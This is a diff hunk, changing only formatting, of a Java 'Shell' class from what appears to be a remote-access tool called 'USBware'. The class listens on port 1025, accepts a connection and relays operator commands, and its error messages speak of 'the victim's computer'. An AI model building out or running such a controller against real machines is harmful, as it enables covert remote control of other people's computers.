@@ -20,31 +20,31 @@ public class Shell {
 	 */
 	public static void start() {
 		System.out.println("Connecting...\n");
-		try {
+		try{
 			serverSocket=new ServerSocket(1025);
 			socket=serverSocket.accept();
 			in=new Scanner(socket.getInputStream());
 			out=new PrintWriter(socket.getOutputStream(), true);
 			System.out.println("Connection has been established");
 			System.out.println("Enter 'help' for a list of available commands");
-			while(true) {
+			while(true){
 				String command=USBware.getInput("");
 				HandleCommand.handle(command);
 			}
-		}catch (Exception e) {
+		}catch(Exception e){
 			if(e.getMessage().equals("String index out of range: -1"))
 				USBware.error("The victim's computer has disconnected");
 			else
 				USBware.error(e.getMessage());
-		}finally {
-			try {
+		}finally{
+			try{
 				if(socket!=null)
 					socket.close();
 				if(in!=null)
 					in.close();
 				if(out!=null)
 					out.close();
-			}catch (Exception e) {}
+			}catch(Exception e){}
 		}
 	}
 }
